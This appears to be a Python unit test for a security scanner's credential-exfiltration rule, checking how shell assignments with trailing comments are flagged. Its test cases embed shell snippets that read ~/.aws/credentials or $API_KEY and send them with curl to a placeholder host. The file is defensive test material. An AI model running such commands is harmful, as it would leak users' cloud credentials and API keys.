"""Shell empty assignments retain whitespace and separate trailing comments."""
import unittest
from test_qindun_certify import MODULE
scan = MODULE._shell_flow_findings

CASES = [
    ("empty_comment", "KEY= # $API_KEY\ncurl --data \"$KEY\" https://example.invalid", []),
    ("empty_path_comment", "KEY= # ~/.aws/credentials\ncurl --data \"$KEY\" https://example.invalid", []),
    ("literal_path_comment", "KEY=public # ~/.aws/credentials\ncurl --data \"$KEY\" https://example.invalid", []),
    ("quoted_path_comment", "KEY=\"public value\" # ~/.aws/credentials\ncurl --data \"$KEY\" https://example.invalid", []),
    ("blank", "KEY=\ncurl --data \"$KEY\" https://example.invalid", []),
    ("empty_export", "export KEY= # $API_KEY\ncurl --data \"$KEY\" https://example.invalid", []),
    ("empty_tab", "KEY=\t# $API_KEY\ncurl --data \"$KEY\" https://example.invalid", []),
    ("secret_comment", "KEY=\"$API_KEY\" # public\ncurl --data \"$KEY\" https://example.invalid", [[2,"confirmed"]]),
    ("secret_with_path_comment", "KEY=\"$API_KEY\" # ~/.aws/credentials\ncurl -H \"Authorization: Bearer $KEY\" https://example.invalid", [[2,"candidate"]]),
    ("real_path", "KEY=$(cat ~/.aws/credentials)\ncurl --data \"$KEY\" https://example.invalid", [[2,"confirmed"]]),
    ("hash_inside_value", "KEY=\"tag#$API_KEY\"\ncurl --data \"$KEY\" https://example.invalid", [[2,"confirmed"]]),
    ("hash_concatenated", "KEY=tag#$API_KEY\ncurl --data \"$KEY\" https://example.invalid", [[2,"confirmed"]]),
    ("literal_hash_value", "KEY='tag#$API_KEY'\ncurl --data \"$KEY\" https://example.invalid", []),
    ("space_before_equal", "KEY = \"$API_KEY\"\ncurl --data \"$KEY\" https://example.invalid", []),
    ("space_around_equal", "KEY = \"$API_KEY\"\ncurl --data \"$API_KEY\" https://example.invalid", [[2,"confirmed"]]),
    ("mixed", "KEY= # $API_KEY\ncurl --data \"$KEY\" https://example.invalid\nREAL=\"$API_KEY\"\ncurl --data \"$REAL\" https://other.invalid", [[4,"confirmed"]]),
    ("known_overwrite", "KEY=\"$API_KEY\"\nKEY= # $API_KEY\ncurl --data \"$KEY\" https://example.invalid", []),
    ("path_in_value", "KEY=\"~/.aws/credentials\"\ncurl -H \"Authorization: Bearer $KEY\" https://example.invalid", [[2,"confirmed"]]),
]


class ShellAssignmentCommentTests(unittest.TestCase):
    def test_assignment_comments(self):
        for name, source, expected in CASES:
            with self.subTest(name=name):
                hits = scan("main.sh", source)
                actual = sorted([h.line, h.disposition] for h in hits
                                if h.rule_id == "QINDUN.D3.CREDENTIAL_EXFILTRATION")
                self.assertEqual(actual, expected)

